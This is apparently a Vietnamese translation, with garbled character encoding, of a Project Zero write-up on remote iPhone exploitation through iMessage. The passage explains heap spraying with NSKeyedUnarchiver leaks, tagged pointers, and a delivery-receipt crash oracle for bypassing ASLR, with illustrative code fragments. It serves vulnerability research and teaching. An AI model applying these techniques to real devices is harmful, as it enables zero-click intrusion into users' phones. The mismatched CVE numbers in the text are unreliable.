I"Ü<p>BÃ i viáº¿t nÃ y Ä‘Æ°á»£c mÃ¬nh dá»‹ch tá»« blog cá»§a team <a href="https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-2.html">Google Project Zero</a>.</p>

<p>ÄÃ¢y lÃ  pháº§n thá»© hai cá»§a series khai thÃ¡c lá»— há»•ng CVE-2019â€“8641 cá»§a app iMessage trÃªn iOS 12.4. Náº¿u báº¡n chÆ°a hiá»ƒu hoáº·c quÃªn máº¥t chuyá»‡n gÃ¬ Ä‘ang xáº£y ra, hÃ£y xem láº¡i <a href="https://medium.com/@ZeroUnix/project-zero-remote-iphone-exploitation-p1-85ed8aeddf51">pháº§n trÆ°á»›c</a>.</p>

<p>LÃºc trÆ°á»›c chÃºng ta Ä‘ang nÃ³i Ä‘áº¿n Ä‘oáº¡n tÃ¬m address space cá»§a thiáº¿t bá»‹. BÃ i viáº¿t láº§n nÃ y sáº½ xoay quanh viá»‡c bypass ASLR mÃ  khÃ´ng cáº§n pháº£i cÃ³ sá»± tÆ°Æ¡ng tÃ¡c cá»§a ngÆ°á»i dÃ¹ng hay pháº£i tÃ¬m thÃªm lá»— há»•ng nÃ o cáº£.</p>

<p>Äáº§u tiÃªn ta sáº½ bÃ n vá» má»™t ká»¹ thuáº­t khÃ¡ â€œxÆ°a cÅ©â€: <strong>heap spraying</strong>. Ká»¹ thuáº­t nÃ y sáº½ giÃºp ta tÃ¬m ra Ä‘Æ°á»£c <em>base_address</em> cá»§a <a href="http://www.manpagez.com/man/1/dyld/">DYLD_SharedCached_Region</a> (má»™t dynamic linker cá»§a iOS) dá»±a trÃªn lá»—i trÃ n bá»™ nhá»›.</p>

<h1 id="heap-spraying-trÃªn-ios">Heap spraying trÃªn iOS</h1>

<p>Má»¥c Ä‘Ã­ch cá»§a viá»‡c sá»­ dá»¥ng heap spraying lÃ  Ä‘á»ƒ Ä‘Æ°a data vÃ o má»™t vÃ¹ng Ä‘á»‹a chá»‰ biáº¿t trÆ°á»›c vÃ  tham chiáº¿u Ä‘áº¿n nÃ³ khi khai thÃ¡c. Heap spraying ngÃ y nay cÅ©ng khÃ´ng cÃ²n hiá»‡u quáº£ ná»¯a (15 nÄƒm tuá»•i rá»“i) vÃ¬ sá»± cÃ³ máº·t cá»§a ASLR vÃ  Ä‘a pháº§n cÃ¡c mÃ¡y Ä‘á»u sá»­ dá»¥ng 64-bit architecture. Tuy nhiÃªn, trÃªn iOS thÃ¬ ká»¹ thuáº­t nÃ y váº«n cÃ³ thá»ƒ xÃ i Ä‘Æ°á»£c bÃ¬nh thÆ°á»ng vÃ  cÅ©ng chá»‰ cáº§n khoáº£ng 256MB data Ä‘á»ƒ cÃ³ thá»ƒ chuyá»ƒn control data vÃ o vÃ¹ng Ä‘á»‹a chá»‰ trÃªn thiáº¿t bá»‹. HÃ£y xem Ä‘oáº¡n code sau:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td> --><td class="rouge-code"><pre><span class="k">const</span> <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="mh">0x4000</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">size_t</span> <span class="n">count</span> <span class="o">=</span> <span class="p">(</span><span class="mi">256</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">/</span> <span class="n">size</span><span class="p">;</span>
<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
     <span class="kt">int</span><span class="o">*</span> <span class="n">chunk</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
     <span class="o">*</span><span class="n">chunk</span> <span class="o">=</span> <span class="mh">0x41414141</span><span class="p">;</span>
<span class="p">}</span>
   <span class="c1">// Giá» hÃ£y Ä‘á»ƒ Ã½ vÃ¹ng Ä‘á»‹a chá»‰ 0x110000000 trong bá»™ nhá»›</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Sau khi thá»±c thi thÃ¬ Ä‘oáº¡n code sáº½ set giÃ¡ trá»‹ táº¡i <code class="language-plaintext highlighter-rouge">0x110000000</code> thÃ nh ` 0x41414141`:</p>

<pre><code class="language-pseudocode">(lldb) x/gx 0x110000000
0x110000000: 0x0000000041414141
</code></pre>

<h2 id="heap-spraying-imessage">Heap spraying iMessage</h2>

<p>Äiá»u tiáº¿p theo chÃºng ta lÃ m lÃ  tÃ¬m hiá»ƒu cÃ¡ch tá»‘t nháº¥t Ä‘á»ƒ â€œsprayâ€ vÃ i trÄƒm MB data qua iMessage. NÃ³i Ä‘Æ¡n giáº£n thÃ¬ cÃ³ hai cÃ¡ch Ä‘á»ƒ lÃ m Ä‘iá»u Ä‘Ã³ nhÆ° sau:</p>

<ol>
  <li>Báº±ng cÃ¡ch lá»£i dá»¥ng bug memory leak â€” má»™t bug mÃ  chunk data bá»‹ â€œlÃ£ng quÃªnâ€ vÃ  khÃ´ng bao giá» Ä‘Æ°á»£c giáº£i phÃ³ng, tá»« Ä‘Ã³ ta cÃ³ thá»ƒ khiáº¿n nÃ³ nhÃ¢n lÃªn vÃ i láº§n cho Ä‘áº¿n khi trÃ n bá»™ nhá»›.</li>
  <li>Hoáº·c khai thÃ¡c â€œamplification gadgetâ€: má»™t Ä‘oáº¡n code nhá» dÃ¹ng Ä‘á»ƒ láº¥y chunk data cÃ³ sáºµn ra rá»“i copy =&gt; ta chá»‰ cáº§n gá»­i má»™t vÃ i byte rá»“i Ä‘á»ƒ nÃ³ tá»± <em>khuáº¿ch Ä‘áº¡i</em> liÃªn tá»¥c nhÆ° tháº¿ Ä‘á»ƒ Ä‘áº¡t Ä‘Æ°á»£c lÆ°á»£ng byte mÃ  ta muá»‘n.</li>
</ol>

<p>May máº¯n lÃ  NSKeyedUnarchiver API cÅ©ng â€œtÃ i trá»£â€ luÃ´n cho chÃºng ta trong exploit láº§n nÃ y: NÃ³ gá»­i Ä‘Æ°á»£c tin nháº¯n táº§m 100kB lÃ  maximun rá»“i, vÃ¬ váº­y khi mÃ¬nh spray khoáº£ng 32MB heap data nÃ³ sáº½ leak ra 32MB vÃ  ta sáº½ láº·p láº¡i Ä‘iá»u Ä‘Ã³ má»™t vÃ i láº§n cho Ä‘áº¿n khi Ä‘Æ°á»£c full heap spray.</p>

<p>NhÆ°ng mÃ  ta cÃ³ thá»ƒ gá»­i toÃ n bá»™ sá»‘ byte cáº§n spray chá»‰ vá»›i má»™t tin nháº¯n báº±ng cÃ¡ch sá»­ dá»¥ng tÃ­nh nÄƒng <strong>download attachments</strong> (pbdi key). Báº±ng cÃ¡ch nÃ y, memory leak lÃ  Ä‘iá»u khÃ´ng cáº§n thiáº¿t ná»¯a vÃ  bug cÃ³ thá»ƒ Ä‘Æ°á»£c trigger vÃ i láº§n náº¿u cáº§n thiáº¿t. MÃ¬nh sáº½ dÃ nh pháº§n nÃ y cho báº¡n Ä‘á»c nhÆ° má»™t exercise nhÃ©.</p>

<p>CÃ³ ráº¥t nhiá»u chá»— trong subsystem cá»§a NSKeyedUnarchive bá»‹ leak memory. VÃ­ dá»¥ nhÆ° pháº§n <em>cyclic object graph</em> trong pháº§n má»™t, khi mÃ  chunk data khÃ´ng bao giá» Ä‘Æ°á»£c giáº£i phÃ³ng mÃ  cá»© liÃªn tá»¥c tham chiáº¿u láº«n nhau. Hay má»™t subclass khÃ¡c lÃ  <em>__NSKeyedCoderOldStyleArray</em> (dÃ¹ng Ä‘á»ƒ decode <a href="https://developer.apple.com/documentation/foundation/nsvalue">NSValues</a>) láº¡i luÃ´n deserialize má»i class báº¥t ká»ƒ cÃ³ Ä‘Æ°á»£c phÃ©p hay khÃ´ng. __NSKeyedCoderOldStyleArray sáº½ lÆ°u size vÃ  con trá» cá»§a nÃ³ vÃ o má»™t chunk Ä‘Ã£ Ä‘Æ°á»£c khá»Ÿi táº¡o dÆ°á»›i dáº¡ng cÃ¹ng kiá»ƒu dá»¯ liá»‡u (integer, CString hoáº·c ObjC object).</p>

<p>ThÃº vá»‹ lÃ  khi __NSKeyedCoderOldStyleArray bá»‹ giáº£i phÃ³ng, nÃ³ chá»‰ free Ä‘Ãºng pháº§n backing memory vÃ  khÃ´ng free object bÃªn trong. Do Ä‘Ã³, máº£ng chá»©a cÃ¡c con trá» sáº½ trá» Ä‘áº¿n má»™t vÃ¹ng nhá»› khÃ¡c dáº«n Ä‘áº¿n memory leak. Äiá»u nÃ y Ä‘Ã¡ng ra khÃ´ng quÃ¡ tá»‡ vÃ¬ __NSKeyedCoderOldStyleArray chá»‰ Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ decode â€œtáº¡m thá»iâ€ má»™t máº£ng cá»§a NSValue nhÆ°ng vÃ¬ __NSKeyedCoderOldStyleArray cÅ©ng cÃ³ thá»ƒ <em>Ä‘Æ°á»£c decode</em> dÆ°á»›i dáº¡ng má»™t standalone object khiáº¿n nÃ³ leak nhá»¯ng ObjC object bÃªn trong.</p>

<p>NgoÃ i ra pháº§n <em>amplification gadget</em> cÅ©ng cÃ³ má»™t instance ACZeroingString cÅ©ng Ä‘Ã³ng vai trÃ² quan trá»ng trong exploit vÃ¬ nÃ³ lÃ  má»™t pháº§n cá»§a <em>initWithCoder</em>, ACZeroingString sáº½ láº¥y má»™t NSData object rá»“i copy ná»™i dung vÃ o má»™t vÃ¹ng nhá»› má»›i.</p>

<p>Sau Ä‘Ã¢y lÃ  graph cá»§a viá»‡c spray 32MB heap data:</p>

<p><img src="https://miro.medium.com/max/800/0*n1CVMeFdgXWIO6lh.png" alt="Image for post" /></p>

<p>Ta cÃ³ thá»ƒ tháº¥y á»Ÿ má»—i instance ACZeroingString nÃ³ sáº½ copy ná»™i dung cá»§a NSData vÃ o má»™t buffer vÃ  __NSKeyedCoderOldStyleArrray sáº½ giá»¯ toÃ n bá»™ instance Ä‘Ã³ Ä‘Æ°á»£c liÃªn tá»¥c update ká»ƒ cáº£ khi tin nháº¯n Ä‘Ã£ Ä‘Æ°á»£c gá»­i Ä‘i. Sau khi gá»­i 8 tin nháº¯n nhÆ° tháº¿ nÃ y, control data sáº½ cÃ³ Ä‘á»‹a chá»‰ táº¡i <em>0x110000000</em>.</p>

<p>Viá»‡c chuyá»ƒn control data vÃ o Ä‘á»‹a chá»‰ trÃªn chá»‰ lÃ  bÆ°á»›c Ä‘áº§u tiÃªn mÃ  thÃ´i. Tiáº¿p theo chÃºng ta sáº½ pháº£i táº¡o cÃ¡c <em>Ä‘á»‘i tÆ°á»£ng ObjC giáº£</em> trong vÃ¹ng heapspray vÃ  Ä‘á»ƒ há»‡ thá»‘ng xá»­ lÃ­ chÃºng trong key index cá»§a NSSharedKeySet. Tuy nhiÃªn, vÃ¬ ná»™i dung bÃªn trong heapspray khÃ´ng thá»ƒ cháº¡y Ä‘Æ°á»£c, ta cáº§n pháº£i biáº¿t Ä‘á»‹a chá»‰ cá»§a code page trÆ°á»›c khi lÃ m giáº£ object.</p>

<h1 id="bypass-aslr-báº±ng-objective-c">Bypass ASLR báº±ng Objective-C</h1>

<p>DÆ°á»›i Ä‘Ã¢y lÃ  má»™t snippet cá»§a <strong>[NSSharedKeySet indexForKey:]</strong></p>

<pre><code class="language-pseudocode">// index is fully controlled, _keys is nullptr
      id candidate = self-&gt;_keys[index];
      if (candidate != null) {
        if ([key isEqual:candidate]) {
          return prevLength + index;
        }
      }
</code></pre>

<p>Kiá»ƒu dá»¯ liá»‡u â€˜idâ€™ Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y lÃ  Ä‘áº¡i diá»‡n cho viá»‡c tham chiáº¿u Ä‘áº¿n ObjC object, na nÃ¡ <code class="language-plaintext highlighter-rouge">void*</code> trong C. NhÆ°ng Ä‘iá»u khÃ¡c biá»‡t lÃ  Object-C cÃ³ RTTI (<strong>R</strong>un-<strong>t</strong>ime <strong>T</strong>ype <strong>I</strong>nformation) nÃªn nÃ³ sáº½ luÃ´n biáº¿t Ä‘Æ°á»£c kiá»ƒu dá»¯ liá»‡u cá»§a má»™t object trong runtime, vÃ­ dá»¥ nhÆ° <a href="https://developer.apple.com/documentation/objectivec/1418956-nsobject/1418511-iskindofclass?language=objc"><em>isKindOfClass</em></a> method. HÆ¡n ná»¯a, ObjC há»— trá»£ pointer tagging (con trá» Ä‘á»‹a chá»‰), vÃ  object pointer (con trá» Ä‘á»‘i tÆ°á»£ng). VÃ¬ tháº¿, â€˜idâ€™ cÃ³ thá»ƒ lÃ  má»™t trong hai thá»© sau:</p>

<ol>
  <li>LÃ  má»™t object pointer</li>
  <li>LÃ  má»™t pointer-sized value chá»©a cáº£ kiá»ƒu dá»¯ liá»‡u láº«n thÃ´ng tin.</li>
</ol>

<p>Pháº§n layout cá»§a nhá»¯ng object nÃ y ráº¥t quan trá»ng vÃ¬ nÃ³ chÃ­nh lÃ  â€˜chÃ¬a khÃ³aâ€™ Ä‘á»ƒ ta cÃ³ Ä‘Æ°á»£c RCE nhÆ°ng trong bÃ i viáº¿t nÃ y ta sáº½ khoan nháº¯c Ä‘áº¿n nÃ³ mÃ  chá»‰ dá»«ng á»Ÿ pháº§n tagged pointer trÆ°á»›c Ä‘Ã£.</p>

<p><a href="https://developer.apple.com/documentation/foundation/nsnumber?language=objc">NSNumbers</a> vÃ  <a href="https://developer.apple.com/documentation/foundation/nsstring">NSStrings</a> lÃ  hai vÃ­ dá»¥ cho tagged pointer. TrÃªn bá»™ xá»­ lÃ­ Arm64, má»™t â€˜idâ€™ Ä‘Æ°á»£c xem nhÆ° lÃ  má»™t tagged pointer náº¿u <a href="https://github.com/opensource-apple/objc4/blob/cd5e62a5597ea7a31dccef089317abb3a661c154/runtime/objc-config.h#L79">flag MSB</a> cá»§a nÃ³ Ä‘Æ°á»£c set. Trong trÆ°á»ng há»£p Ä‘Ã³, class tÆ°Æ¡ng á»©ng sáº½ Ä‘Æ°á»£c <a href="https://github.com/opensource-apple/objc4/blob/cd5e62a5597ea7a31dccef089317abb3a661c154/runtime/objc-object.h#L656">lÆ°u trong má»™t global table</a> vÃ  index cá»§a table Ä‘Ã³ sáº½ Ä‘Æ°á»£c encode vÃ o tagged pointer. Tháº¿ nÃªn má»™t instance NSNumber chá»©a má»™t 32-bit integer (trong ObjC: <code class="language-plaintext highlighter-rouge">NSNumber* n = @42</code>) sáº½ Ä‘Æ°á»£c biá»ƒu diá»…n nhÆ° sau:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>0xb0000000000002a2
(1 011 00â€¦001010100010)
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Khi Ä‘Ã³ MSB flag sáº½ cÃ³ giÃ¡ trá»‹ (1), ra hiá»‡u ráº±ng má»™t tagged pointer vÃ  3 bit tiáº¿p theo cá»§a nÃ³ lÃ  index cá»§a class. Náº¿u MSB flag lÃ  (3), tÆ°Æ¡ng á»©ng vá»›i __NSCFNumber, giÃ¡ trá»‹ 32-bit cá»§a con trá» sáº½ náº±m trong bit 8-&gt;40 trong khi cÃ¡c byte dÆ°á»›i cÃ¹ng chá»‰ ra kiá»ƒu dá»¯ liá»‡u, trong trÆ°á»ng há»£p nÃ y lÃ  <a href="https://developer.apple.com/documentation/corefoundation/cfnumbertype/kcfnumbersint32type?language=objc">kCFNumberSInt32Type</a>.</p>

<p>CÃ¡c API thÆ°á»ng sáº½ kiá»ƒm tra tag bit cá»§a cÃ¡c â€˜idâ€™ ObjC (objc_msgSend, objc_retain, objc_xyz):</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td> --><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="n">arg</span> <span class="o">&amp;</span> <span class="mh">0x8000000000000000</span><span class="p">)</span> <span class="p">{</span>
 <span class="c1">// handle tagged pointer</span>
 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
 <span class="c1">// handle real pointer</span>
 <span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>PhÆ°Æ¡ng thá»©c kiá»ƒm tra nÃ y lÃ  Ä‘á»ƒ chá»‘ng cÃ¡c <a href="http://www.phrack.org/issues/69/9.html">ká»¹ thuáº­t khai thÃ¡c tagged pointer</a>, giÃ¡ trá»‹ cá»§a cÃ¡c tagged pointer sáº½ Ä‘Æ°á»£c XOR vá»›i má»™t giÃ¡ trá»‹ báº¥t kÃ¬ cho má»—i process:</p>

<pre><code class="language-pseudocode">0xb0000000000002a2 ^ objc_debug_taggedpointer_obfuscator
</code></pre>

<p><code class="language-plaintext highlighter-rouge">objc_debug_taggedpointer_obfuscator</code> cÃ³ láº½ lÃ  má»™t con sá»‘ hoÃ n toÃ n ngáº«u nhiÃªn chá»‰ trá»« MSB thÃ¬ nÃ³ cÃ³ giÃ¡ trá»‹ lÃ  â€˜0â€™ (bit dÃ nh riÃªng cho tagged pointer). Sá»­ dá»¥ng lldb vÃ  má»™t app iOS Ä‘Æ¡n giáº£n ta cÃ³ Ä‘Æ°á»£c nhÆ° sau:</p>

<pre><code class="language-objective-c">(lldb) p n
(__NSCFNumber *) $0 = 0xf460034a00975a82 (int)42
(lldb) p objc_debug_taggedpointer_obfuscator
(void *) $1 = 0x4460034a00975820
(lldb) p/x (uintptr_t)n ^ (uintptr_t)objc_debug_taggedpointer_obfuscator
(unsigned long) $9 = 0xb0000000000002a2
</code></pre>

<h2 id="dyld-shared-cache">Dyld Shared Cache</h2>

<p>TrÃªn iOS (hoáº·c macOS), háº§u háº¿t cÃ¡c thÆ° viá»‡n há»‡ thá»‘ng Ä‘á»u Ä‘Æ°á»£c prelink vÃ o má»™t binary blob ráº¥t lá»›n Ä‘Æ°á»£c gá»i lÃ  <a href="https://iphonedevwiki.net/index.php/Dyld_shared_cache">dyld_shared_cache</a>. Äiá»u nÃ y giÃºp cáº£i thiá»‡n load-time ráº¥t Ä‘Ã¡ng ká»ƒ.</p>

<p>Máº·t khÃ¡c, shared cache Ä‘Æ°á»£c há»‡ thá»‘ng map láº¡i vá»›i cÃ¹ng má»™t Ä‘á»‹a chá»‰ cho má»i process vÃ  chá»‰ Ä‘Æ°á»£c random má»™t láº§n duy nháº¥t lÃ  khi thiáº¿t bá»‹ boot. NguyÃªn nhÃ¢n cÃ³ thá»ƒ lÃ  do shared cache bá»‹ map vÃ o toÃ n bá»™ process cá»§a user (lÃ m giáº£m hiá»‡u suáº¥t chung cá»§a bá»™ nhá»› há»‡ thá»‘ng) Ä‘á»“ng thá»i nÃ³ cÅ©ng chá»©a má»™t con trá» cá»§a chÃ­nh nÃ³ ná»¯a khiáº¿n cho share cache cÃ³ thá»ƒ <a href="https://en.wikipedia.org/wiki/Position-independent_code">Ä‘Æ°á»£c copy tá»« báº¥t kÃ¬ khu vá»±c bá»™ nhá»› nÃ o</a>. NÃªn ta sáº½ biáº¿t Ä‘Æ°á»£c base_address dá»±a vÃ o Ä‘á»‹a chá»‰ cá»§a shared cache, base_address sáº½ chá»©a Ä‘á»‹a chá»‰ cá»§a háº§u háº¿t cÃ¡c thÆ° viá»‡n mÃ  cÃ¡c process cá»§a user Ä‘ang sá»­ dá»¥ng, bao gá»“m: cÃ¡c tiá»‡n Ã­ch ROP (gadget), má»i ObjC class, chuá»—i vÃ  nhiá»u thá»© khÃ¡c. QuÃ¡ Ä‘á»§ Ä‘á»ƒ thá»±c hiá»‡n khai thÃ¡c RCE.</p>

<p>á» nhá»¯ng phiÃªn báº£n má»›i nháº¥t cá»§a iOS, dyld_shared_cache sáº½ Ä‘Æ°á»£c map láº¡i Ä‘Ã¢u Ä‘Ã³ trong vÃ¹ng tá»« 0x180000000 Ä‘Ã©n 0x280000000, bao gá»“m hÆ¡n 200000 base_address cÅ©ng nhÆ° cache cá»§a nÃ³ cÅ©ng pháº£i xáº¥p xá»‰ 1GB vÃ  page size cá»§a nÃ³ khoáº³ng 0x4000 byte. Ta cÃ³ thá»ƒ tÃ¬m nhá»¯ng base_address theo Ã½ mÃ¬nh báº±ng bruteforce, nhÆ°ng má»—i láº§n sai cÃ³ thá»ƒ process sáº½ bá»‹ crash vÃ  sáº½ bá»‹ giá»›i háº¡n bá»Ÿi service <em>launchd</em> náº¿u bruteforce cá»§a ta lÃ m mÃ¡y crash quÃ¡ nhiá»u láº§n. Äiá»u nÃ y cÃ³ thá»ƒ Ä‘Æ°á»£c trÃ¡nh báº±ng cÃ¡ch chá»‰ crash má»—i 10s =&gt; tá»‘n Ä‘áº¿n 3â€“4 tuáº§n Ä‘á»ƒ bruteforce â€” exploit kiá»ƒu nÃ y khÃ´ng kháº£ thi láº¯m. NhÆ°ng pháº§n tiáº¿p theo sáº½ chá»‰ ra cÃ¡ch tÃ¬m base_address chá»‰ trong vÃ²ng chÆ°a Ä‘áº¿n nÄƒm phÃºt.</p>

<h2 id="bypass-aslr-vá»›i-oracle-crash">Bypass ASLR vá»›i Oracle Crash</h2>

<p>Má»™t thá»© ráº¥t Ä‘áº·c biá»‡t cá»§a lá»— há»•ng CVE-2019â€“8646 lÃ  nÃ³ cÃ³ thá»ƒ táº¡o ra má»™t communication channel giá»¯a victim vÃ  attacker. ÄÃ¢y cÅ©ng lÃ  má»™t tÃ¬nh huá»‘ng nghiÃªm trá»ng mÃ  cÃ¡c nhÃ  phÃ¡t hÃ nh nÃªn lÆ°u Ã½ khi Ä‘á»ƒ cÃ¡c tiáº¿n trÃ¬nh tá»± do thá»±c hiá»‡n cÃ¡c network request ngoÃ i sandbox. VÃ  Ä‘á»ƒ cÃ³ Ä‘Æ°á»£c RCE nháº¯c Ä‘áº¿n á»Ÿ pháº§n má»™t, ta pháº£i tÃ¬m communication channel cá»§a iMessage.</p>

<p>iMessage cÅ©ng há»— trá»£ cÃ¡c tÃ­nh nÄƒng nhÆ° â€œreadâ€ (Ä‘Ã£ xem), â€œdeliveredâ€ (Ä‘Ã£ gá»­i) tÆ°Æ¡ng tá»± nhÆ° seen hay sent cá»§a app Messenger cá»§a Facebook.</p>

<p><img src="https://miro.medium.com/max/698/0*moeYbETbI9FYeskT.png" alt="Image for post" style="zoom:67%;" /></p>

<p>NgÆ°á»i gá»­i nháº­n Ä‘Æ°á»£c tÃ­n hiá»‡u â€˜Ä‘Ã£ xemâ€™ cá»§a ngÆ°á»i nháº­n á»Ÿ tin nháº¯n â€œFooâ€ vÃ  tÃ­n hiá»‡u â€˜Ä‘Ã£ gá»­iâ€™ á»Ÿ tin nháº¯n â€œBarâ€ cÃ²n â€œBazâ€ thÃ¬ khÃ´ng cÃ³ gÃ¬ cáº£. CÃ¡c <em>tÃ­n hiá»‡u</em> Ä‘Ã³ Ä‘Æ°á»£c gá»­i Ä‘i vÃ  nháº­n láº¡i má»™t cÃ¡ch tá»± Ä‘á»™ng vÃ  khÃ´ng cáº§n sá»± tÆ°Æ¡ng tÃ¡c cá»§a ngá»i dÃ¹ng, Ä‘áº·c biá»‡t nÃ³ cÃ²n Ä‘Æ°á»£c gá»­i bá»Ÿi tiáº¿n trÃ¬nh <strong>imagent</strong>.</p>

<p>Pseudocode cÃ¡ch imagent xá»­ lÃ­ tin nháº¯n:</p>

<pre><code class="language-pseudocode">processIncomingMessage(message):
msgPlist = decodeIntoPlist(message)
# extract some values from the plist â€¦
atiData = msgPlist['ATI']
ati = NSKeyedUnarchive(atiData) [1]
# more stuff â€¦
sendDeliveryReceipt()
# yet more stuff â€¦
</code></pre>

<p>Báº¥t kÃ¬ bug nÃ o trong NSKeyedUnarchiver API cÅ©ng sáº½ Ä‘Æ°á»£c <em>kÃ­ch hoáº¡t</em> táº¡i [1] nÃªn ta cÃ³ thá»ƒ build má»™t â€œoracle crashâ€ náº¿u ta cÃ³ thá»ƒ crash khi API NSKeyedUnarchiver Ä‘ang lÃ m viá»‡c thÃ¬ sáº½ khÃ´ng cÃ³ thÃ´ng bÃ¡o â€˜deliveryâ€™ nÃ o Ä‘Æ°á»£c gá»­i Ä‘i mÃ  thay vÃ o Ä‘Ã³ lÃ  má»™t payload chÃºng ta muá»‘n. Äiá»u nÃ y cho phÃ©p <em>ngÆ°á»i gá»­i</em> cÃ³ thá»ƒ tÃ¹y Ã½ crash tiáº¿n trÃ¬nh imagent cá»§a thiáº¿t bá»‹ nháº­n. Lá»£i dá»¥ng Ä‘iá»u nÃ y, ta cÃ³ thá»ƒ chuyá»ƒn tá»« má»™t bug thÃ nh má»™t â€œfeatureâ€ cÃ³ lá»£i cho viá»‡c táº¥n cÃ´ng rá»“i.</p>

<p>Ta cÃ³ thá»ƒ hiá»ƒu Ä‘Æ¡n giáº£n cÃ¡c truy váº¥n oracle diá»…n ra nhÆ° sau:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td> --><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">oracle</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
     <span class="k">if</span> <span class="n">isMapped</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
       <span class="n">nocrash</span><span class="p">()</span>
     <span class="k">else</span>
       <span class="n">crash</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Nhá» Ä‘Ã³, viá»‡c bypass ASLR tá»« xa trá»Ÿ nÃªn Ä‘Æ¡n giáº£n hÆ¡n:</p>

<ol>
  <li>Thá»±c hiá»‡n <a href="https://vietjack.com/cau-truc-du-lieu-va-giai-thuat/giai-thuat-tim-kiem-tuyen-tinh.jsp"><em>tÃ¬m kiáº¿m tuyáº¿n tÃ­nh</em></a> <em>(linear search)</em> giá»¯a hai vÃ¹ng 0x18000000 vÃ  0x28000000, má»—i bÆ°á»›c nháº£y ~500MB, viá»‡c tÃ¬m kiáº¿m nÃ y sáº½ chiáº¿m nhiá»u nháº¥t 8 láº§n truy váº¥n oracle.</li>
  <li>Thá»±c hiá»‡n <a href="https://vietjack.com/cau-truc-du-lieu-va-giai-thuat/giai-thuat-tim-kiem-nhi-phan.jsp"><em>tÃ¬m kiáº¿m nhá»‹ phÃ¢n</em></a> <em>(binary search)</em> giá»¯a cÃ¡c Ä‘á»‹a chá»‰ tÃ¬m Ä‘Æ°á»£c á»Ÿ bÆ°á»›c má»™t. BÆ°á»›c tÃ¬m kiáº¿m nÃ y cÅ©ng chá»‰ chiáº¿m má»™t vÃ i truy váº¥n thÃ´i vÃ¬ nÃ³ cháº¡y trong thá»i gian logarithm.</li>
</ol>

<p>Äá»ƒ bypass ASLR thÃ¬ Ã­t nháº¥t 10 vÃ  khÃ´ng nhiá»u hÆ¡n 20 tin nháº¯n iMessage Ä‘Æ°á»£c gá»­i Ä‘i.</p>

<p>Tuy nhiÃªn trong thá»±c táº¿ thÃ¬ lá»— há»•ng bá»™ nhá»› sáº½ khÃ´ng giÃºp chÃºng ta thá»±c hiá»‡n truy váº¥n má»™t cÃ¡ch dá»… dÃ ng nhÆ° tháº¿ nÃ y. VÃ¬ váº­y ta cáº§n pháº£i cÃ³ má»™t phiÃªn báº£n tá»•ng quÃ¡t hÆ¡n cá»§a thuáº­t toÃ¡n trÃªn. DÃ¹ sao thÃ¬ trong má»i trÆ°á»ng há»£p, Ä‘á»ƒ khai thÃ¡c Ä‘Æ°á»£c lá»— há»•ng trÆ°á»›c háº¿t pháº£i Ä‘Ã¡p á»©ng Ä‘Æ°á»£c má»™t sá»‘ kÄ© thuáº­t khai thÃ¡c nháº¥t Ä‘á»‹nh. ÄÃ¢y cÅ©ng lÃ  yÃªu cáº§u dÃ nh cho CVE-2018â€“8641.</p>

<p>Äáº§u tiÃªn, bug trigger Ä‘Ã£ nháº¯c Ä‘áº¿n á»Ÿ pháº§n má»™t cá»§a series nÃ y luÃ´n lÃ m crash há»‡ thá»‘ng máº·c dÃ¹ cÃ³ Ä‘á»‹a chá»‰ há»£p lá»‡.</p>

<pre><code class="language-objective-c">-[NSSharedKeyDictionary initWithCoder:coder] {
  self-&gt;_keyMap = [coder decodeObjectOfClass:[NSSharedKeySet class]
                         forKey:"NS.skkeyset"];
  // ... decode values etc.
}

-[NSSharedKeySet initWithCoder:coder] {
  self-&gt;_numKey = [coder decodeInt64ForKey:@"NS.numKey"];
  self-&gt;_rankTable = [coder decodeBytesForKey:@"NS.rankTable"];
  // ... copy more fields from the archive
  self-&gt;_subSharedKeySet = [coder 
                            decodeObjectOfClass:[NSSharedKeySet class]
                            forKey:@"NS.subskset"]];

  NSArray* keys = [coder decodeObjectOfClasses:[...] 
                         forKey:@"NS.keys"]];
  if (self-&gt;_numKey != [keys count]) {
    return fail(â€œInconsistent archive);
  }
  self-&gt;_keys = calloc(self-&gt;_numKey, 8);
  // copy keys into _keys

  // Verify that all keys can be looked up
  for (id key in keys) {
    if ([self indexForKey:key] == -1) {
      NSMutableArray* allKeys = [NSMutableArray arrayWithArray:keys];
      [allKeys addObjectsFromArray:[self-&gt;_subSharedKeySet allKeys]];
      return [NSSharedKeySet keySetWithKeys:allKeys];
    }
  }
}
</code></pre>

